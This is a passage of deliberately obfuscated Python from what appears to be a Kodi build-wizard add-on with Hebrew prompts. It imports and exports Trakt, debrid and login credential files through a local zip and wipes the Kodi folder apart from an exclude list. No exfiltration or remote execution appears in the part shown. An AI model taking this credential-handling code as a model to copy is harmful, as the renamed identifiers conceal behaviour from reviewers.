		OO0OO0OO0OO0OOO00 =wiz .checkBuild (OOOO0O0O00O0OOO00 ,'preview')#line:4476
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOO0O0O00O0OOO00 )#line:4477
		if OO0OO0OO0OO0OOO00 and not OO0OO0OO0OO0OOO00 =='http://':playVideo (OO0OO0OO0OO0OOO00 )#line:4478
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOO0O0O00O0OOO00 )#line:4479
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4480
def dependsList (OOO00000OOO00000O ):#line:4482
	OO0O0000OO0O0O00O =os .path .join (ADDONS ,OOO00000OOO00000O ,'addon.xml')#line:4483
	if os .path .exists (OO0O0000OO0O0O00O ):#line:4484
		O0O000OO00OOO0O0O =open (OO0O0000OO0O0O00O ,mode ='r');O00OOO0000O0000O0 =O0O000OO00OOO0O0O .read ();O0O000OO00OOO0O0O .close ();#line:4485
		OOO0OOO0OO0OO0OO0 =wiz .parseDOM (O00OOO0000O0000O0 ,'import',ret ='addon')#line:4486
		OOO00O0O00O0OOO00 =[]#line:4487
		for O000OOOOOOO00OOOO in OOO0OOO0OO0OO0OO0 :#line:4488
			if not 'xbmc.python'in O000OOOOOOO00OOOO :#line:4489
				OOO00O0O00O0OOO00 .append (O000OOOOOOO00OOOO )#line:4490
		return OOO00O0O00O0OOO00 #line:4491
	return []#line:4492
def manageSaveData (OO0O00O0O0O00O0OO ):#line:4494
	if OO0O00O0O0O00O0OO =='import':#line:4495
		O000O00000O0OOO00 =os .path .join (ADDONDATA ,'temp')#line:4496
		if not os .path .exists (O000O00000O0OOO00 ):os .makedirs (O000O00000O0OOO00 )#line:4497
		O00OOOO00O0O0OOOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4498
		if not O00OOOO00O0O0OOOO .endswith ('.zip'):#line:4499
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4500
			return #line:4501
		O0OO00000O0OO0O0O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4502
		O0O0OO00000OOO000 =xbmcvfs .copy (O00OOOO00O0O0OOOO ,O0OO00000O0OO0O0O )#line:4503
		wiz .log ("%s"%str (O0O0OO00000OOO000 ))#line:4504
		extract .all (xbmc .translatePath (O0OO00000O0OO0O0O ),O000O00000O0OOO00 )#line:4505
		O00OOOOO0OOO00000 =os .path .join (O000O00000O0OOO00 ,'trakt')#line:4506
		OO0OO00000O0000O0 =os .path .join (O000O00000O0OOO00 ,'login')#line:4507
		OOO000OO0OO00O00O =os .path .join (O000O00000O0OOO00 ,'debrid')#line:4508
		OO0OOO000OO000O00 =0 #line:4509
		if os .path .exists (O00OOOOO0OOO00000 ):#line:4510
			OO0OOO000OO000O00 +=1 #line:4511
			O000OOOOO0O0O0O0O =os .listdir (O00OOOOO0OOO00000 )#line:4512
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4513
			for O0O00O0OOOO0000O0 in O000OOOOO0O0O0O0O :#line:4514
				O00OOO0OOOO00OOOO =os .path .join (traktit .TRAKTFOLD ,O0O00O0OOOO0000O0 )#line:4515
				O0O00OO000OOOOOOO =os .path .join (O00OOOOO0OOO00000 ,O0O00O0OOOO0000O0 )#line:4516
				if os .path .exists (O00OOO0OOOO00OOOO ):#line:4517
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0OOOO0000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4518
					else :os .remove (O00OOO0OOOO00OOOO )#line:4519
				shutil .copy (O0O00OO000OOOOOOO ,O00OOO0OOOO00OOOO )#line:4520
			traktit .importlist ('all')#line:4521
			traktit .traktIt ('restore','all')#line:4522
		if os .path .exists (OO0OO00000O0000O0 ):#line:4523
			OO0OOO000OO000O00 +=1 #line:4524
			O000OOOOO0O0O0O0O =os .listdir (OO0OO00000O0000O0 )#line:4525
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4526
			for O0O00O0OOOO0000O0 in O000OOOOO0O0O0O0O :#line:4527
				O00OOO0OOOO00OOOO =os .path .join (loginit .LOGINFOLD ,O0O00O0OOOO0000O0 )#line:4528
				O0O00OO000OOOOOOO =os .path .join (OO0OO00000O0000O0 ,O0O00O0OOOO0000O0 )#line:4529
				if os .path .exists (O00OOO0OOOO00OOOO ):#line:4530
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0OOOO0000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4531
					else :os .remove (O00OOO0OOOO00OOOO )#line:4532
				shutil .copy (O0O00OO000OOOOOOO ,O00OOO0OOOO00OOOO )#line:4533
			loginit .importlist ('all')#line:4534
			loginit .loginIt ('restore','all')#line:4535
		if os .path .exists (OOO000OO0OO00O00O ):#line:4536
			OO0OOO000OO000O00 +=1 #line:4537
			O000OOOOO0O0O0O0O =os .listdir (OOO000OO0OO00O00O )#line:4538
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4539
			for O0O00O0OOOO0000O0 in O000OOOOO0O0O0O0O :#line:4540
				O00OOO0OOOO00OOOO =os .path .join (debridit .REALFOLD ,O0O00O0OOOO0000O0 )#line:4541
				O0O00OO000OOOOOOO =os .path .join (OOO000OO0OO00O00O ,O0O00O0OOOO0000O0 )#line:4542
				if os .path .exists (O00OOO0OOOO00OOOO ):#line:4543
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O0OOOO0000O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4544
					else :os .remove (O00OOO0OOOO00OOOO )#line:4545
				shutil .copy (O0O00OO000OOOOOOO ,O00OOO0OOOO00OOOO )#line:4546
			debridit .importlist ('all')#line:4547
			debridit .debridIt ('restore','all')#line:4548
		wiz .cleanHouse (O000O00000O0OOO00 )#line:4549
		wiz .removeFolder (O000O00000O0OOO00 )#line:4550
		os .remove (O0OO00000O0OO0O0O )#line:4551
		if OO0OOO000OO000O00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4552
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4553
	elif OO0O00O0O0O00O0OO =='export':#line:4554
		OOO0OOOO0O0OOO000 =xbmc .translatePath (MYBUILDS )#line:4555
		OOO0OO000O0O0000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4556
		traktit .traktIt ('update','all')#line:4557
		loginit .loginIt ('update','all')#line:4558
		debridit .debridIt ('update','all')#line:4559
		O00OOOO00O0O0OOOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4560
		O00OOOO00O0O0OOOO =xbmc .translatePath (O00OOOO00O0O0OOOO )#line:4561
		O0OO0OOOO0000OOO0 =os .path .join (OOO0OOOO0O0OOO000 ,'SaveData.zip')#line:4562
		OO00OO00O000000O0 =zipfile .ZipFile (O0OO0OOOO0000OOO0 ,mode ='w')#line:4563
		for OOO0OO0O00OOOOOO0 in OOO0OO000O0O0000O :#line:4564
			if os .path .exists (OOO0OO0O00OOOOOO0 ):#line:4565
				O000OOOOO0O0O0O0O =os .listdir (OOO0OO0O00OOOOOO0 )#line:4566
				for O00O00O000OOOO0OO in O000OOOOO0O0O0O0O :#line:4567
					OO00OO00O000000O0 .write (os .path .join (OOO0OO0O00OOOOOO0 ,O00O00O000OOOO0OO ),os .path .join (OOO0OO0O00OOOOOO0 ,O00O00O000OOOO0OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4568
		OO00OO00O000000O0 .close ()#line:4569
		if O00OOOO00O0O0OOOO ==OOO0OOOO0O0OOO000 :#line:4570
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OOOO0000OOO0 ))#line:4571
		else :#line:4572
			try :#line:4573
				xbmcvfs .copy (O0OO0OOOO0000OOO0 ,os .path .join (O00OOOO00O0O0OOOO ,'SaveData.zip'))#line:4574
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OOOO00O0O0OOOO ,'SaveData.zip')))#line:4575
			except :#line:4576
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OOOO0000OOO0 ))#line:4577
def freshStart (install =None ,over =False ):#line:4582
	if USERNAME =='':#line:4583
		ADDON .openSettings ()#line:4584
		sys .exit ()#line:4585
	O0OOOOO00OO0O000O =u_list (SPEEDFILE )#line:4586
	(O0OOOOO00OO0O000O )#line:4587
	O0O0O0OO000OOO000 =(wiz .workingURL (O0OOOOO00OO0O000O ))#line:4588
	(O0O0O0OO000OOO000 )#line:4589
	if KEEPTRAKT =='true':#line:4590
		traktit .autoUpdate ('all')#line:4591
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4592
	if KEEPREAL =='true':#line:4593
		debridit .autoUpdate ('all')#line:4594
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4595
	if KEEPLOGIN =='true':#line:4596
		loginit .autoUpdate ('all')#line:4597
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4598
	if over ==True :O0OO000O0OOOOO0O0 =1 #line:4599
	elif install =='restore':O0OO000O0OOOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4600
	elif install :O0OO000O0OOOOO0O0 =1 #line:4601
	else :O0OO000O0OOOOO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4602
	if O0OO000O0OOOOO0O0 :#line:4603
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4604
			OO00OOOOOO00O0OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4605
			skinSwitch .swapSkins (OO00OOOOOO00O0OO0 )#line:4608
			OO0OOOO0OO0OO00OO =0 #line:4609
			xbmc .sleep (1000 )#line:4610
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OOOO0OO0OO00OO <150 :#line:4611
				OO0OOOO0OO0OO00OO +=1 #line:4612
				xbmc .sleep (1000 )#line:4613
				wiz .ebi ('SendAction(Select)')#line:4614
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4615
				wiz .ebi ('SendClick(11)')#line:4616
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4617
			xbmc .sleep (1000 )#line:4618
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4619
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4620
			return #line:4621
		wiz .addonUpdates ('set')#line:4622
		OOOOOO0O0O00O0000 =os .path .abspath (HOME )#line:4623
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4624
		O000O0OO00OO00O0O =sum ([len (O0O00OO0OO00O0O0O )for OO0O0O00OOO00OOO0 ,OOOOO000O0OO0O000 ,O0O00OO0OO00O0O0O in os .walk (OOOOOO0O0O00O0000 )]);OO0O000OO000O00OO =0 #line:4625
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4626
		EXCLUDES .append ('My_Builds')#line:4627
		EXCLUDES .append ('archive_cache')#line:4628
		EXCLUDES .append ('script.module.requests')#line:4629
		EXCLUDES .append ('myfav.anon')#line:4630
		if KEEPREPOS =='true':#line:4631
			O00OO00OO00O0OO00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4632
			for O000000O0O0O0OO00 in O00OO00OO00O0OO00 :#line:4633
				O00O0000OO000O0OO =os .path .split (O000000O0O0O0OO00 [:-1 ])[1 ]#line:4634
				if not O00O0000OO000O0OO ==EXCLUDES :#line:4635
					EXCLUDES .append (O00O0000OO000O0OO )#line:4636
		if KEEPSUPER =='true':#line:4637
			EXCLUDES .append ('plugin.program.super.favourites')#line:4638
		if KEEPMOVIELIST =='true':#line:4639
			EXCLUDES .append ('plugin.video.metalliq')#line:4640
		if KEEPMOVIELIST =='true':#line:4641
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4642
		if KEEPADDONS =='true':#line:4643
			EXCLUDES .append ('addons')#line:4644
		if KEEPADDONS =='true':#line:4645
			EXCLUDES .append ('addon_data')#line:4646
		EXCLUDES .append ('plugin.video.elementum')#line:4649
		EXCLUDES .append ('script.elementum.burst')#line:4650
		EXCLUDES .append ('script.elementum.burst-master')#line:4651
		EXCLUDES .append ('plugin.video.quasar')#line:4652
		EXCLUDES .append ('script.quasar.burst')#line:4653
		EXCLUDES .append ('skin.estuary')#line:4654
		if KEEPWHITELIST =='true':#line:4657
			O00O0O000OOO000OO =''#line:4658
			OOO0OO0OO0O0000O0 =wiz .whiteList ('read')#line:4659
			if len (OOO0OO0OO0O0000O0 )>0 :#line:4660
				for O000000O0O0O0OO00 in OOO0OO0OO0O0000O0 :#line:4661
					try :OOO0000O0000O0000 ,OOO00O000O000OO0O ,OOOO0000OOO0O0000 =O000000O0O0O0OO00 #line:4662
					except :pass #line:4663
					if OOOO0000OOO0O0000 .startswith ('pvr'):O00O0O000OOO000OO =OOO00O000O000OO0O #line:4664
					OOOO0O0O0O00O0OO0 =dependsList (OOOO0000OOO0O0000 )#line:4665
					for OOOOO00000OOOOO0O in OOOO0O0O0O00O0OO0 :#line:4666
						if not OOOOO00000OOOOO0O in EXCLUDES :#line:4667
							EXCLUDES .append (OOOOO00000OOOOO0O )#line:4668
						OOO0OO0O0O0O00OO0 =dependsList (OOOOO00000OOOOO0O )#line:4669
						for OO00O00O0O0O00OOO in OOO0OO0O0O0O00OO0 :#line:4670
							if not OO00O00O0O0O00OOO in EXCLUDES :#line:4671
								EXCLUDES .append (OO00O00O0O0O00OOO )#line:4672
					if not OOOO0000OOO0O0000 in EXCLUDES :#line:4673
						EXCLUDES .append (OOOO0000OOO0O0000 )#line:4674
				if not O00O0O000OOO000OO =='':wiz .setS ('pvrclient',OOOO0000OOO0O0000 )#line:4675
		if wiz .getS ('pvrclient')=='':#line:4676
			for O000000O0O0O0OO00 in EXCLUDES :#line:4677
				if O000000O0O0O0OO00 .startswith ('pvr'):#line:4678
					wiz .setS ('pvrclient',O000000O0O0O0OO00 )#line:4679
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4680
		OO0OO00000000OO00 =wiz .latestDB ('Addons')#line:4681
		for O0OOOOOOOO0000OO0 ,O0000O00O00O00OOO ,O0OO000000O00O0O0 in os .walk (OOOOOO0O0O00O0000 ,topdown =True ):#line:4682
			O0000O00O00O00OOO [:]=[O0O00OO00OOO00OO0 for O0O00OO00OOO00OO0 in O0000O00O00O00OOO if O0O00OO00OOO00OO0 not in EXCLUDES ]#line:4683
			for OOO0000O0000O0000 in O0OO000000O00O0O0 :#line:4684
				OO0O000OO000O00OO +=1 #line:4685
				OOOO0000OOO0O0000 =O0OOOOOOOO0000OO0 .replace ('/','\\').split ('\\')#line:4686
				OO0OOOO0OO0OO00OO =len (OOOO0000OOO0O0000 )-1 #line:4688
				if OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4689
				elif OOO0000O0000O0000 =='MyVideos99.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4690
				elif OOO0000O0000O0000 =='MyVideos107.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4691
				elif OOO0000O0000O0000 =='MyVideos116.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4692
				elif OOO0000O0000O0000 =='MyVideos99.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4693
				elif OOO0000O0000O0000 =='MyVideos107.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4694
				elif OOO0000O0000O0000 =='MyVideos116.db'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4695
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4696
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4697
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'skin.Premium.mod'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4698
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4699
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'skin.phenomenal'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4700
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4701
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'skin.titan'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4703
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4704
				elif OOO0000O0000O0000 =='sources.xml'and OOOO0000OOO0O0000 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4706
				elif OOO0000O0000O0000 =='quicknav.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4709
				elif OOO0000O0000O0000 =='x1101.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4710
				elif OOO0000O0000O0000 =='b-srtym-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4711
				elif OOO0000O0000O0000 =='x1102.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4712
				elif OOO0000O0000O0000 =='b-sdrvt-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4713
				elif OOO0000O0000O0000 =='x1112.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4714
				elif OOO0000O0000O0000 =='b-tlvvyzyh-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4715
				elif OOO0000O0000O0000 =='x1111.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4716
				elif OOO0000O0000O0000 =='b-tvknyshrly-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4717
				elif OOO0000O0000O0000 =='x1110.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4718
